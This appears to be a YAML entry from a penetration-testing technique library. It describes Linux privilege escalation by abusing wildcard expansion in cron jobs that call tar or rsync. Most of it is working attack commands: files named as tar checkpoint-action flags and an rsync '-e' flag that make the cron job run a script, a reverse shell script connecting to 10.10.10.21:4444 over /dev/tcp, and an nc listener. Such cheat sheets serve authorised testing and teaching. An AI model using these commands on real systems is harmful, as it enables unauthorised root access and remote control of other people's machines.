---
description: |
  Exploit wildcard expansion in cron jobs or scripts using tar, rsync, and other utilities to achieve privilege escalation.
command: |
  # Find cron jobs using tar with wildcards:
  cat /etc/crontab
  ls -la /etc/cron.d/
  # Look for: tar czf backup.tar.gz *

  # Create checkpoint files in the target directory:
  echo "" > "--checkpoint=1"
  echo "" > "--checkpoint-action=exec=sh shell.sh"

  # Create reverse shell payload (shell.sh):
  echo '#!/bin/bash' > shell.sh
  echo 'bash -i >& /dev/tcp/10.10.10.21/4444 0>&1' >> shell.sh
  chmod +x shell.sh

  # Start listener and wait for cron execution:
  nc -lvnp 4444

  # Rsync wildcard injection:
  echo "" > "-e sh shell.sh"

  # Verify exploit files were created:
  ls -la
  # Should see: --checkpoint=1, --checkpoint-action=exec=sh shell.sh, shell.sh
items:
  - Shell
phase:
  - PrivEsc
target_os:
  - Linux
services: []
techniques:
  - Cron_Abuse
references:
  - https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks
  - https://www.exploit-db.com/papers/33930
---
